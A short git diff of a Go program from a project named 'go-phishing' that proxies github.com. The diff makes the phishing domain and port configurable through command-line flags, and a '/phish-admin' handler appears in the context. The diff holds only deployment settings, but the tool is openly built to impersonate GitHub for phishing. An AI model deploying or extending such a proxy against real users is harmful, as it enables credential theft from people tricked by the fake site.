@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -11,9 +12,11 @@ import (
 	"go-phishing/db"
 )
 
-const (
-	upstreamURL = "https://github.com"
-	phishURL    = "http://localhost:8080"
+const upstreamURL = "https://github.com"
+
+var (
+	phishURL string
+	port     string
 )
 
 func replaceURLInResp(body []byte, header http.Header) []byte {
@@ -149,11 +152,15 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部屬在哪個網域")
+	flag.StringVar(&port, "port", ":8080", "部屬在哪個 port")
+	flag.Parse()
+
 	db.Connect()
 
 	http.HandleFunc("/phish-admin", adminHandler)
 	http.HandleFunc("/", handler)
-	err := http.ListenAndServe(":8080", nil)
+	err := http.ListenAndServe(port, nil)
 	if err != nil {
 		panic(err)
 	}
